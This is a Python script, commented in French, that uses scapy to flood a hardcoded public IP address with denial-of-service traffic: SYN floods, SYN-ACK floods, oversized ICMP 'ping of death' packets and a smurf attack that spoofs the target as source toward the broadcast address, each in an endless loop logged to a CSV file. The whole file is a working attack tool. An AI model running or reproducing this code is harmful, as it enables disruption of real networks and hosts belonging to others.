from scapy.all import IP, TCP, ICMP, send, Raw
import random
import ipaddress
import sys
import time
from time import sleep
import csv

def ddos(target_ip, attack_type):
    # Validation de l'adresse IP cible
    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        print(f"Adresse IP non valide : {target_ip}")
        return

    target_port = 12345

    try:
        with open('attacks_log.csv', mode='a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(['timestamp', 'ip_address', 'attack_type'])

            if attack_type == "syn_flood":
                while True:
                    src_port = random.randint(1024, 65535)
                    pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
                    print(pkt.summary())  # Vérifie le paquet avant de l'envoyer
                    send(pkt, verbose=0)
                    writer.writerow([time.time(), target_ip, "syn_flood"])
                    sleep(0.1)  # Ajoute un délai

            elif attack_type == "pod":  # Ping of Death
                while True:
                    load = b'X' * 6000  # Crée une charge de 6000 octets
                    pkt = IP(dst=target_ip) / ICMP() / Raw(load)
                    print(pkt.summary())
                    send(pkt, verbose=0)
                    writer.writerow([time.time(), target_ip, "pod"])
                    sleep(0.1)

            elif attack_type == "syn_ack":
                while True:
                    src_port = random.randint(1024, 65535)
                    pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
                    print(pkt.summary())
                    send(pkt, verbose=0)
                    writer.writerow([time.time(), target_ip, "syn_ack"])
                    sleep(0.1)

            elif attack_type == "smurf":
                broadcast_ip = "255.255.255.255"  # Utilise une adresse de broadcast pour une attaque Smurf
                while True:
                    pkt = IP(src=target_ip, dst=broadcast_ip) / ICMP()
                    print(pkt.summary())
                    send(pkt, verbose=0)
                    writer.writerow([time.time(), target_ip, "smurf"])
                    sleep(0.1)

            else:
                print(f"Type d'attaque non valide : {attack_type}")

    except KeyboardInterrupt:
        print("\nAttaque arrêtée par l'utilisateur.")
        sys.exit(0)

# Variables
target_ip = "163.173.228.225"
attack_type = 'syn_ack'  # syn_flood, pod, syn_ack, smurf

try:
    ddos(target_ip, attack_type)
except KeyboardInterrupt:
    print("\nAttaque arrêtée par l'utilisateur.")